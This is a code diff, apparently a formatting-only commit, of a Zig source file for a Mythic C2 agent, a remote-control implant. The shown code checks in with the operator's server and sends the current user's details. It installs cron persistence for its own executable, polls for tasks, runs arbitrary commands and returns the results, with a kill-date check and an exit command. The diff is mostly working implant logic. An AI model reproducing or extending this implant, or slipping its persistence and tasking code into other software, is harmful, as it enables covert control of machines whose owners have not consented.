@@ -25,7 +25,7 @@ const PersistUtils = utils.PersistUtils;
 
 pub const MythicAgent = struct {
     const Self = @This();
-    
+
     allocator: Allocator,
     config: AgentConfig,
     uuid: []const u8,
@@ -34,21 +34,21 @@ pub const MythicAgent = struct {
     command_executor: CommandExecutor,
     system_info: SystemInfo,
     crypto_utils: CryptoUtils,
-    
+
     aes_key: [32]u8, //For future use watch this space
     payload_uuid: []const u8,
-    
+
     tasks: std.ArrayListUnmanaged(MythicTask),
     pending_responses: std.ArrayListUnmanaged(MythicResponse),
     is_running: bool,
     last_checkin: i64,
-    
+
     pub fn init(allocator: Allocator, agent_config: types.AgentConfig) !Self {
         var crypto_utils = CryptoUtils.init(allocator);
-        
-        const session_id = try crypto_utils.generateSessionId();//session_id might be useful later. Not implemented yet
+
+        const session_id = try crypto_utils.generateSessionId(); //session_id might be useful later. Not implemented yet
         const aes_key = CryptoUtils.generateAESKey();
-        
+
         return Self{
             .allocator = allocator,
             .config = agent_config,
@@ -66,26 +66,26 @@ pub const MythicAgent = struct {
             .last_checkin = 0,
         };
     }
-    
+
     pub fn deinit(self: *Self) void {
         self.allocator.free(self.session_id);
         self.tasks.deinit(self.allocator);
         self.pending_responses.deinit(self.allocator);
         self.network_client.deinit();
     }
-    
+
     pub fn run(self: *Self) !void {
         self.is_running = true;
-        
+
         try self.checkin();
         // Install persistence after first check-in
         const exepath = try std.fs.selfExePathAlloc(self.allocator);
         defer self.allocator.free(exepath);
 
         PersistUtils.install_cron(exepath, self.allocator) catch |err| {
-        std.debug.print("{}", .{err});
+            std.debug.print("{}", .{err});
         };
-        
+
         while (self.is_running) {
             if (self.config.kill_date) |kill_date| {
                 if (TimeUtils.isKillDateReached(kill_date)) {
@@ -116,9 +116,8 @@ pub const MythicAgent = struct {
 
             self.sleep();
         }
-
     }
-    
+
     fn checkin(self: *Self) !void {
         const user = try self.system_info.getCurrentUser();
         defer self.allocator.free(user);
@@ -160,7 +159,7 @@ pub const MythicAgent = struct {
         defer combined.deinit(self.allocator);
         try combined.appendSlice(self.allocator, self.payload_uuid);
         try combined.appendSlice(self.allocator, json_bytes);
-        
+
         const encoder = base64.standard.Encoder;
         const b64_len = encoder.calcSize(combined.items.len);
         const b64_data = try self.allocator.alloc(u8, b64_len);
@@ -169,7 +168,6 @@ pub const MythicAgent = struct {
 
         const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
-
 
         const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
             print("", .{});
@@ -199,13 +197,13 @@ pub const MythicAgent = struct {
 
         self.last_checkin = TimeUtils.getCurrentTimestamp();
     }
-    
+
     fn getTasks(self: *Self) !void {
         const get_tasking_data = .{
             .action = "get_tasking",
             .tasking_size = 1,
         };
-        
+
         var json_writer = std.Io.Writer.Allocating.init(self.allocator);
         defer json_writer.deinit();
 
@@ -228,7 +226,6 @@ pub const MythicAgent = struct {
 
         const response = try self.network_client.sendRequest("data", b64_data);
         defer self.allocator.free(response);
-        
 
         const decoded_len = base64.standard.Decoder.calcSizeForSlice(response) catch {
             print("", .{});
@@ -241,7 +238,7 @@ pub const MythicAgent = struct {
             print("", .{});
             return error.InvalidBase64;
         };
-        
+
         if (response.len < 36) {
             return error.InvalidResponse;
         }
@@ -252,43 +249,43 @@ pub const MythicAgent = struct {
             parameters: json.Value,
         };
         const json_response = decoded_response[36..];
-        
+
         const parsed = json.parseFromSlice(struct { action: []const u8, tasks: []Task }, self.allocator, json_response, .{}) catch |err| {
             print("{}", .{err});
             return err;
         };
         defer parsed.deinit();
-    
+
         try self.parseTaskResponse(json_response);
     }
-    
+
     fn parseTaskResponse(self: *Self, response: []const u8) !void {
         const parsed = json.parseFromSlice(json.Value, self.allocator, response, .{}) catch return;
         defer parsed.deinit();
-        
+
         if (parsed.value.object.get("tasks")) |tasks_value| {
             if (tasks_value.array.items.len > 0) {
                 for (tasks_value.array.items) |task_value| {
                     const task_obj = task_value.object;
-                    
+
                     const task = MythicTask{
                         .id = try self.allocator.dupe(u8, task_obj.get("id").?.string),
                         .command = try self.allocator.dupe(u8, task_obj.get("command").?.string),
                         .parameters = try self.allocator.dupe(u8, task_obj.get("parameters").?.string),
-                        .timestamp = try std.fmt.allocPrint(self.allocator, "{d}", .{task_obj.get("timestamp").?.integer}), 
+                        .timestamp = try std.fmt.allocPrint(self.allocator, "{d}", .{task_obj.get("timestamp").?.integer}),
                     };
-                    
+
                     try self.tasks.append(self.allocator, task);
                 }
             }
         }
     }
-    
+
     fn processTasks(self: *Self) !void {
         for (self.tasks.items) |*task| {
             if (task.status == .submitted) {
                 task.status = .processing;
-                
+
                 if (std.mem.eql(u8, task.command, "exit")) {
                     self.is_running = false;
                     const exit_response = MythicResponse{
@@ -301,7 +298,7 @@ pub const MythicAgent = struct {
                     task.status = .completed;
                     continue;
                 }
-                
+
                 const result = self.command_executor.executeTask(task.*) catch |err| {
                     const error_response = MythicResponse{
                         .task_id = task.id,
@@ -313,13 +310,13 @@ pub const MythicAgent = struct {
                     task.status = .erroragent;
                     continue;
                 };
-                
+
                 try self.pending_responses.append(self.allocator, result);
                 task.status = .completed;
             }
         }
     }
-    
+
     fn sendResponses(self: *Self) !void {
         if (self.pending_responses.items.len == 0) return;
 
